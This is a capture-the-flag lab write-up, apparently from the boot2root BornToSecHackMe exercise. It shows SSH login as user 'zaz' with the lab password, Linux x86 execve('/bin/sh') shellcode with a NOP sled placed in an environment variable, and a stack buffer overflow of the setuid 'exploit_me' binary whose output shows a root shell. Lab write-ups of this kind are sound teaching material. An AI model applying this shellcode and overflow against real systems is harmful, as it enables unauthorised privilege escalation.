# SSH zaz - Jump to Shell code

From `zaz` [step](https://github.com/4slan/boot2root/blob/main/writeup1.md#ssh-zaz---bofret2libc) get the offset and exploit the binary by jumping on shellcode instead of ret2libc.
```shell
kali@kali:~$ ssh zaz@192.168.56.101
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.56.101's password: 646da671ca01bb5d84dbb5fb2238dc8e
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
```

<details>
<summary>getEnvAddress.c program</summary>

```c
#include <stdio.h>
#include <stdlib.h>
int main(int ac, char *av[]) {
   printf("%s at %p\n", av[1], getenv(av[1]));
}
```
</details>

Export the shell code in the environment variable and get its address using `getEnvAddress` executable.
```shell
zaz@BornToSecHackMe:~$ export SHELL_CODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
zaz@BornToSecHackMe:~$ gcc getEnvAddress.c -o getEnvAddress
zaz@BornToSecHackMe:~$ ./getEnvAddress SHELL_CODE
SHELL_CODE at 0xbffffec4
```
With gather informations implement exploit and run to get root permissions.
```shell
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "import struct; print('A'*140 + struct.pack('I', 0xbffffec4))")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```

